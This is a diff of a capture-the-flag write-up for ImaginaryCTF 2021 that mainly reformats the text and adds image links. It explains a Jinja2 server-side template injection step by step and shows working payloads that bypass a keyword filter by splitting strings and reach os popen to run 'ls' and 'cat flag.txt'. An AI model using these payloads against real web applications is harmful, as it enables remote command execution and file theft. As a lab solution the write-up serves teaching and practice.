@@ -18,23 +18,34 @@ def site():
 
 **{{request["__cl"+"ass__"]["__mro__"]}}**
 
-<pic.1>
+![avatar](https://github.com/piggyctf/writeups/blob/main/Imaginary-ctf-2021/imgs/1.jpg)
 The request here is a variable created before. We can also use other objects like [] '' or {}... The main point here is to get Object Class from Python.
 
 Then we choose the index 3 in the tuple and we get an Object class:
-{{request["__cl"+"ass__"]["__mro__"][3]}}
-<pic.2>
+
+**{{request["__cl"+"ass__"]["__mro__"][3]}}**
+
+![avatar](https://github.com/piggyctf/writeups/blob/main/Imaginary-ctf-2021/imgs/2.jpg)
+
 The next steps are about to see all used classes, we can achive that through calling 'subclasses'.
-{{request["__cl"+"ass__"]["__mro__"][3]["__subcl"+"asses__"]()}}
-<pic.3>
+
+**{{request["__cl"+"ass__"]["__mro__"][3]["__subcl"+"asses__"]()}}**
+
+![avatar](https://github.com/piggyctf/writeups/blob/main/Imaginary-ctf-2021/imgs/3.jpg)
+
 Notice we got quite a lot of classes. We need to choose the exploitable ones. For instance os._wrap_close. We can also use other classes and the resources are easy to find on Internet :) The class here can be called via : "os._wrap_close.__init__.__globals__['popen']('INPUT YOUR LINUX COMMAND HERE').read()" Then we have the payload as following:
-{{request["__cl"+"ass__"]["__mro__"][3]["__subcl"+"asses__"]()[132]['__init__']['__glob'+'als__']['popen']('ls').read()}}
+
+**{{request["__cl"+"ass__"]["__mro__"][3]["__subcl"+"asses__"]()[132]['__init__']['__glob'+'als__']['popen']('ls').read()}}**
 
 Upon executing the ls command, we can see the files in current path:
-<pic.4>
+
+![avatar](https://github.com/piggyctf/writeups/blob/main/Imaginary-ctf-2021/imgs/4.jpg)
+
 And we are able to see the content of the 'flag.txt' through command cat. Here is the final payload we used:
-{{request["__cl"+"ass__"]["__mro__"][3]["__subcl"+"asses__"]()[132]['__init__']['__glob'+'als__']['popen']('cat flag.txt').read()}}
-<pic.5>
+
+**{{request["__cl"+"ass__"]["__mro__"][3]["__subcl"+"asses__"]()[132]['__init__']['__glob'+'als__']['popen']('cat flag.txt').read()}}**
+
+![avatar](https://github.com/piggyctf/writeups/blob/main/Imaginary-ctf-2021/imgs/5.jpg)
 And BINGO, we got the flag:
 
-ictf{:rooYay:_:rooPOG:_:rooHappy:_:rooooooooooooooooooooooooooo:}
+**ictf{:rooYay:_:rooPOG:_:rooHappy:_:rooooooooooooooooooooooooooo:}**
